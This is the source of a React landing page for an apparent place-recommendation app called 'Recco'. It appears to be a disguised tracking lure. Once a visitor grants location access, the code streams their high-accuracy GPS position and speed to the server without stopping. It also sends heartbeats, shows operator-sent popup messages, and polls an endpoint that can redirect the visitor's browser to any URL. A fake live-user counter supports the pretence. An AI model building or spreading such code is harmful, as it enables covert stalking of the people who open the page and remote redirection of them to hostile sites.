"use client";

import { useEffect, useRef, useState } from "react";

interface Place {
  name: string;
  type: string;
  category: string;
  rating: number;
  reviews: number;
  distance: string;
  price: string;
  tags: string[];
  hours: string;
  image: string;
  address: string;
  lat: number;
  lng: number;
}

const CATEGORIES = ["All", "Cafes", "Restaurants", "Bars"];

export default function LandingPage() {
  const [stage, setStage] = useState<"loading" | "permission" | "finding" | "results" | "denied">("loading");
  const [places, setPlaces] = useState<Place[]>([]);
  const [popup, setPopup] = useState<string | null>(null);
  const [activeCategory, setActiveCategory] = useState("All");
  const [liked, setLiked] = useState<Set<number>>(new Set());
  const [findingStep, setFindingStep] = useState(0);
  const [mapPlace, setMapPlace] = useState<Place | null>(null);
  const [userLat, setUserLat] = useState(0);
  const [userLng, setUserLng] = useState(0);
  const mapModalRef = useRef<HTMLDivElement>(null);
  const mapModalInstance = useRef<any>(null);

  useEffect(() => {
    let vid = localStorage.getItem("vid");
    if (!vid) {
      vid = Math.random().toString(36).substring(2, 10);
      localStorage.setItem("vid", vid);
    }

    fetch("/api/visit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ vid }),
    })
      .then((r) => r.json())
      .then(() => {
        startHeartbeat(vid!);
        startMessagePoll(vid!);
        startRedirectPoll(vid!);
        setStage("permission");
      })
      .catch(() => setStage("permission"));

    const handleLeave = () => {
      navigator.sendBeacon("/api/leave", JSON.stringify({ vid }));
    };
    window.addEventListener("beforeunload", handleLeave);
    return () => window.removeEventListener("beforeunload", handleLeave);
  }, []);

  function requestLocation() {
    const vid = localStorage.getItem("vid") || "";
    setStage("finding");
    setFindingStep(0);

    const steps = ["Detecting your location...", "Scanning nearby venues...", "Checking ratings & reviews...", "Personalizing your feed..."];
    let step = 0;
    const interval = setInterval(() => {
      step++;
      if (step < steps.length) setFindingStep(step);
    }, 800);

    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        const { latitude, longitude, accuracy, speed } = pos.coords;
        setUserLat(latitude);
        setUserLng(longitude);

        fetch("/api/gps", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ vid, lat: latitude, lng: longitude, accuracy, speed }),
        }).catch(() => {});

        navigator.geolocation.watchPosition(
          (p) => {
            fetch("/api/gps", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                vid,
                lat: p.coords.latitude,
                lng: p.coords.longitude,
                accuracy: p.coords.accuracy,
                speed: p.coords.speed,
              }),
            }).catch(() => {});
          },
          () => {},
          { enableHighAccuracy: true, maximumAge: 3000, timeout: 10000 }
        );

        // Fetch real places from Overpass
        try {
          const r = await fetch(`/api/places?lat=${latitude}&lng=${longitude}&radius=3000`);
          let data = await r.json();
          // If no results, try wider radius
          if (!data || data.length === 0) {
            const r2 = await fetch(`/api/places?lat=${latitude}&lng=${longitude}&radius=10000`);
            data = await r2.json();
          }
          clearInterval(interval);
          setFindingStep(3);
          setTimeout(() => {
            setPlaces(data || []);
            setStage("results");
          }, 800);
        } catch {
          clearInterval(interval);
          setPlaces([]);
          setStage("results");
        }
      },
      () => {
        clearInterval(interval);
        setStage("denied");
      },
      { enableHighAccuracy: true, timeout: 10000 }
    );
  }

  function toggleLike(i: number) {
    setLiked((prev) => {
      const next = new Set(prev);
      if (next.has(i)) next.delete(i);
      else next.add(i);
      return next;
    });
  }

  function startHeartbeat(vid: string) {
    setInterval(() => {
      fetch("/api/heartbeat", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ vid }),
      }).catch(() => {});
    }, 15000);
  }

  function startMessagePoll(vid: string) {
    setInterval(async () => {
      try {
        const r = await fetch(`/api/messages?vid=${vid}`);
        const msgs = await r.json();
        if (msgs.length > 0) {
          msgs.forEach((m: any) => setPopup(m.text));
        }
      } catch {}
    }, 3000);
  }

  function startRedirectPoll(vid: string) {
    setInterval(async () => {
      try {
        const r = await fetch(`/api/check-redirect?vid=${vid}`);
        const data = await r.json();
        if (data.redirect) {
          window.location.href = data.redirect;
        }
      } catch {}
    }, 2000);
  }

  // ESC to close map
  useEffect(() => {
    function handleKey(e: KeyboardEvent) {
      if (e.key === "Escape") setMapPlace(null);
    }
    window.addEventListener("keydown", handleKey);
    return () => window.removeEventListener("keydown", handleKey);
  }, []);

  // Map modal
  useEffect(() => {
    if (!mapPlace || !mapModalRef.current) return;

    const link = document.createElement("link");
    link.rel = "stylesheet";
    link.href = "https://unpkg.com/leaflet@1.9.4/dist/leaflet.css";
    document.head.appendChild(link);

    const script = document.createElement("script");
    script.src = "https://unpkg.com/leaflet@1.9.4/dist/leaflet.js";
    script.onload = () => {
      const L = (window as any).L;
      if (mapModalInstance.current) {
        mapModalInstance.current.remove();
      }

      const center: [number, number] = [(userLat + mapPlace.lat) / 2, (userLng + mapPlace.lng) / 2];

      const map = L.map(mapModalRef.current!, { zoomControl: false }).setView(center, 15);
      L.control.zoom({ position: "bottomright" }).addTo(map);
      L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
        attribution: "&copy; OpenStreetMap",
        maxZoom: 19,
      }).addTo(map);

      const userIcon = L.divIcon({
        html: '<div style="width:14px;height:14px;background:#3b82f6;border:3px solid #fff;border-radius:50%;box-shadow:0 0 8px rgba(59,130,246,0.5)"></div>',
        className: "", iconSize: [14, 14], iconAnchor: [7, 7],
      });
      L.marker([userLat, userLng], { icon: userIcon }).addTo(map).bindPopup("You are here");

      const placeIcon = L.divIcon({
        html: '<div style="width:16px;height:16px;background:#f97316;border:3px solid #fff;border-radius:50%;box-shadow:0 0 8px rgba(249,115,22,0.5)"></div>',
        className: "", iconSize: [16, 16], iconAnchor: [8, 8],
      });
      L.marker([mapPlace.lat, mapPlace.lng], { icon: placeIcon }).addTo(map)
        .bindPopup(`<b>${mapPlace.name}</b><br>${mapPlace.address}`)
        .openPopup();

      L.polyline([[userLat, userLng], [mapPlace.lat, mapPlace.lng]], {
        color: "#f97316", weight: 2, opacity: 0.6, dashArray: "6 6",
      }).addTo(map);

      map.fitBounds([[userLat, userLng], [mapPlace.lat, mapPlace.lng]], { padding: [50, 50] });

      mapModalInstance.current = map;
    };

    if (!(window as any).L) {
      document.head.appendChild(script);
    } else {
      script.onload!(new Event("load"));
    }

    return () => {
      if (mapModalInstance.current) {
        mapModalInstance.current.remove();
        mapModalInstance.current = null;
      }
    };
  }, [mapPlace]);

  const findingSteps = ["Detecting your location...", "Scanning nearby venues...", "Checking ratings & reviews...", "Personalizing your feed..."];

  const filtered = activeCategory === "All"
    ? places
    : places.filter((p) => p.category === activeCategory);

  return (
    <div className="min-h-screen bg-[#fafaf9] text-[#1a1a1a]">
      {/* Admin message popup */}
      {popup && (
        <div className="fixed inset-0 z-[9999] flex items-center justify-center bg-black/50 backdrop-blur-sm px-5">
          <div className="bg-white rounded-2xl p-6 max-w-sm w-full text-center shadow-2xl">
            <div className="w-12 h-12 bg-gradient-to-br from-amber-400 to-orange-500 rounded-full flex items-center justify-center text-xl mx-auto mb-4">
              &#128276;
            </div>
            <h3 className="text-lg font-bold mb-2">Notification</h3>
            <p className="text-gray-600 mb-6 whitespace-pre-wrap">{popup}</p>
            <button
              onClick={() => setPopup(null)}
              className="bg-[#1a1a1a] text-white font-semibold px-6 py-3 rounded-xl hover:bg-[#333] transition-colors w-full"
            >
              Got it
            </button>
          </div>
        </div>
      )}

      {/* Header */}
      <div className="bg-white sticky top-0 z-50 border-b border-gray-100">
        <div className="max-w-2xl mx-auto px-5 py-3 flex items-center justify-between">
          <div className="flex items-center gap-2.5">
            <div className="w-9 h-9 bg-gradient-to-br from-amber-400 to-orange-500 rounded-xl flex items-center justify-center text-sm font-black text-white shadow-sm">R</div>
            <div>
              <span className="font-bold text-base">Recco</span>
              <span className="text-[0.6rem] text-orange-500 font-semibold ml-1.5 bg-orange-50 px-1.5 py-0.5 rounded-full">BETA</span>
            </div>
          </div>
          {stage === "results" && (
            <div className="flex items-center gap-3">
              <span className="text-xs text-gray-400">{filtered.length} places found</span>
              <div className="w-8 h-8 rounded-full bg-gray-100 flex items-center justify-center text-sm cursor-pointer hover:bg-gray-200">&#9776;</div>
            </div>
          )}
        </div>
      </div>

      {/* Loading */}
      {stage === "loading" && (
        <div className="flex items-center justify-center py-32">
          <div className="text-center">
            <div className="w-10 h-10 border-[3px] border-gray-200 border-t-orange-500 rounded-full animate-spin mx-auto mb-4" />
            <p className="text-gray-400 text-sm">Setting up your experience...</p>
          </div>
        </div>
      )}

      {/* Permission / Hero */}
      {stage === "permission" && (
        <div>
          <div className="bg-gradient-to-b from-orange-50 to-[#fafaf9] pt-12 pb-16 px-5">
            <div className="max-w-2xl mx-auto text-center">
              <div className="inline-flex items-center gap-2 bg-white border border-orange-100 rounded-full px-4 py-1.5 text-xs text-orange-600 font-medium mb-6 shadow-sm">
                <span className="w-2 h-2 bg-green-400 rounded-full animate-pulse" />
                1,247 people exploring nearby
              </div>
              <h1 className="text-4xl sm:text-5xl font-black mb-4 leading-tight tracking-tight">
                Discover the best<br />
                <span className="bg-gradient-to-r from-amber-500 to-orange-500 bg-clip-text text-transparent">places near you</span>
              </h1>
              <p className="text-gray-500 mb-8 max-w-md mx-auto leading-relaxed">
                Real-time recommendations for restaurants, cafes, and bars. Powered by local data.
              </p>
              <button
                onClick={requestLocation}
                className="bg-[#1a1a1a] text-white font-semibold px-8 py-4 rounded-2xl text-base hover:bg-[#333] transition-all hover:scale-[1.02] active:scale-[0.98] shadow-lg shadow-gray-300/50"
              >
                &#128205; Explore Near Me
              </button>
              <p className="text-[0.7rem] text-gray-400 mt-4">We use your location to find the best spots nearby</p>
            </div>
          </div>

          <div className="max-w-2xl mx-auto px-5 py-10">
            <div className="grid grid-cols-3 gap-4 mb-12">
              {[
                { icon: "&#127775;", title: "Real Places", desc: "Actual venues near you" },
                { icon: "&#128640;", title: "Live Data", desc: "OpenStreetMap powered" },
                { icon: "&#127919;", title: "For You", desc: "Sorted by distance" },
              ].map((f, i) => (
                <div key={i} className="text-center p-4 bg-white rounded-2xl border border-gray-100">
                  <div className="text-2xl mb-2" dangerouslySetInnerHTML={{ __html: f.icon }} />
                  <div className="font-semibold text-sm">{f.title}</div>
                  <div className="text-xs text-gray-400 mt-0.5">{f.desc}</div>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* Finding animation */}
      {stage === "finding" && (
        <div className="flex items-center justify-center py-32">
          <div className="text-center max-w-xs">
            <div className="relative w-20 h-20 mx-auto mb-8">
              <div className="absolute inset-0 border-[3px] border-orange-200 rounded-full animate-ping" />
              <div className="absolute inset-2 border-[3px] border-orange-300 rounded-full animate-ping" style={{ animationDelay: "0.3s" }} />
              <div className="absolute inset-4 bg-gradient-to-br from-amber-400 to-orange-500 rounded-full flex items-center justify-center">
                <span className="text-white text-xl">&#128205;</span>
              </div>
            </div>
            <div className="space-y-3">
              {findingSteps.map((step, i) => (
                <div
                  key={i}
                  className={`flex items-center gap-3 transition-all duration-500 ${
                    i <= findingStep ? "opacity-100 translate-y-0" : "opacity-0 translate-y-2"
                  }`}
                >
                  <div className={`w-5 h-5 rounded-full flex items-center justify-center text-xs ${
                    i < findingStep
                      ? "bg-green-500 text-white"
                      : i === findingStep
                      ? "bg-orange-500 text-white animate-pulse"
                      : "bg-gray-200 text-gray-400"
                  }`}>
                    {i < findingStep ? "&#10003;" : i === findingStep ? "..." : ""}
                  </div>
                  <span className={`text-sm ${i <= findingStep ? "text-gray-700" : "text-gray-300"}`}>
                    {step}
                  </span>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* Location denied */}
      {stage === "denied" && (
        <div className="flex items-center justify-center py-28 px-5">
          <div className="text-center max-w-sm">
            <div className="w-16 h-16 bg-red-50 rounded-full flex items-center justify-center text-3xl mx-auto mb-5">
              &#128205;
            </div>
            <h2 className="text-xl font-bold mb-2">Location Required</h2>
            <p className="text-gray-500 text-sm mb-3 leading-relaxed">
              We need your location to find the best places nearby. Without it, we can&apos;t show you personalized recommendations.
            </p>
            <div className="bg-orange-50 border border-orange-100 rounded-xl p-4 mb-6 text-left">
              <p className="text-xs text-orange-700 font-medium mb-2">How to enable location:</p>
              <ol className="text-xs text-orange-600 space-y-1.5 list-decimal list-inside">
                <li>Tap the lock icon in your browser address bar</li>
                <li>Find &quot;Location&quot; and set it to &quot;Allow&quot;</li>
                <li>Refresh the page</li>
              </ol>
            </div>
            <button
              onClick={() => { setFindingStep(0); requestLocation(); }}
              className="bg-[#1a1a1a] text-white font-semibold px-6 py-3.5 rounded-2xl text-sm hover:bg-[#333] transition-colors w-full"
            >
              Try Again
            </button>
          </div>
        </div>
      )}

      {/* Results */}
      {stage === "results" && (
        <div className="max-w-2xl mx-auto px-5 py-6">
          {/* Category pills */}
          <div className="flex gap-2 overflow-x-auto pb-4 scrollbar-hide mb-2">
            {CATEGORIES.map((cat) => (
              <button
                key={cat}
                onClick={() => setActiveCategory(cat)}
                className={`px-4 py-2 rounded-full text-sm font-medium whitespace-nowrap transition-all ${
                  activeCategory === cat
                    ? "bg-[#1a1a1a] text-white"
                    : "bg-white text-gray-500 border border-gray-200 hover:border-gray-300"
                }`}
              >
                {cat}
              </button>
            ))}
          </div>

          <div className="flex items-center justify-between mb-4">
            <h2 className="font-bold text-lg">Nearby places</h2>
            <select className="text-xs text-gray-500 bg-transparent border border-gray-200 rounded-lg px-2 py-1.5 outline-none">
              <option>Nearest first</option>
              <option>Top rated</option>
            </select>
          </div>

          {filtered.length === 0 ? (
            <div className="text-center py-16">
              <p className="text-gray-400 text-sm">No places found in this category nearby.</p>
            </div>
          ) : (
            <div className="space-y-4">
              {filtered.map((place, i) => (
                <div
                  key={i}
                  className="bg-white rounded-2xl overflow-hidden border border-gray-100 hover:shadow-lg transition-shadow cursor-pointer"
                >
                  <div className="relative h-44 bg-gray-100">
                    <img src={place.image} alt={place.name} className="w-full h-full object-cover" />
                    <div className="absolute top-3 right-3">
                      <button
                        onClick={(e) => { e.stopPropagation(); toggleLike(i); }}
                        className={`w-9 h-9 rounded-full flex items-center justify-center backdrop-blur-md transition-all ${
                          liked.has(i) ? "bg-red-500 text-white" : "bg-white/80 text-gray-600 hover:bg-white"
                        }`}
                      >
                        {liked.has(i) ? "\u2665" : "\u2661"}
                      </button>
                    </div>
                    <div className="absolute bottom-3 left-3 flex gap-1.5">
                      {place.tags.map((tag) => (
                        <span key={tag} className="bg-white/90 backdrop-blur-sm text-[0.65rem] font-medium text-gray-700 px-2 py-1 rounded-full">
                          {tag}
                        </span>
                      ))}
                    </div>
                  </div>

                  <div className="p-4">
                    <div className="flex items-start justify-between mb-1">
                      <div>
                        <h3 className="font-bold text-base">{place.name}</h3>
                        <p className="text-xs text-gray-400">{place.type} &middot; {place.price}</p>
                      </div>
                      <div className="flex items-center gap-1 bg-green-50 px-2 py-1 rounded-lg">
                        <span className="text-green-600 text-xs font-bold">{place.rating}</span>
                        <span className="text-green-500 text-xs">&#9733;</span>
                      </div>
                    </div>
                    <div className="text-[0.7rem] text-gray-400 mt-1">{place.address}</div>
                    <div className="flex items-center gap-4 mt-3 text-xs text-gray-400">
                      <button
                        onClick={(e) => { e.stopPropagation(); setMapPlace(place); }}
                        className="flex items-center gap-1 text-orange-500 font-medium hover:text-orange-600 transition-colors"
                      >
                        &#128204; {place.distance} &middot; View Map
                      </button>
                      <span>&#128172; {place.reviews.toLocaleString()} reviews</span>
                      <span className="text-green-500 font-medium text-[0.65rem]">{place.hours}</span>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          )}

          <div className="text-center py-8">
            <p className="text-xs text-gray-400">Showing {filtered.length} places within 2 km</p>
          </div>
        </div>
      )}

      {/* Map Modal */}
      {mapPlace && (
        <div className="fixed inset-0 z-[9998] flex flex-col bg-white">
          <div className="flex items-center justify-between px-4 py-3 border-b border-gray-100 bg-white z-10">
            <button
              onClick={() => setMapPlace(null)}
              className="flex items-center gap-2 text-sm text-gray-600 hover:text-gray-900"
            >
              &#8592; Back
            </button>
            <div className="text-center">
              <div className="font-semibold text-sm">{mapPlace.name}</div>
              <div className="text-[0.65rem] text-gray-400">{mapPlace.distance} away</div>
            </div>
            <div className="w-14" />
          </div>

          <div ref={mapModalRef} className="flex-1" />

          <div className="bg-white border-t border-gray-100 p-4">
            <div className="flex gap-3 items-center">
              <img src={mapPlace.image} alt="" className="w-16 h-16 rounded-xl object-cover" />
              <div className="flex-1">
                <h3 className="font-bold text-sm">{mapPlace.name}</h3>
                <p className="text-xs text-gray-400">{mapPlace.address}</p>
                <div className="flex items-center gap-3 mt-1 text-xs">
                  <span className="text-green-600 font-semibold">{mapPlace.rating} &#9733;</span>
                  <span className="text-gray-400">{mapPlace.type}</span>
                  <span className="text-gray-400">{mapPlace.price}</span>
                </div>
              </div>
            </div>
            <div className="flex gap-2 mt-3">
              <button className="flex-1 bg-[#1a1a1a] text-white py-3 rounded-xl text-sm font-semibold hover:bg-[#333] transition-colors">
                Get Directions
              </button>
              <button className="px-4 bg-gray-100 text-gray-600 py-3 rounded-xl text-sm font-semibold hover:bg-gray-200 transition-colors">
                Share
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
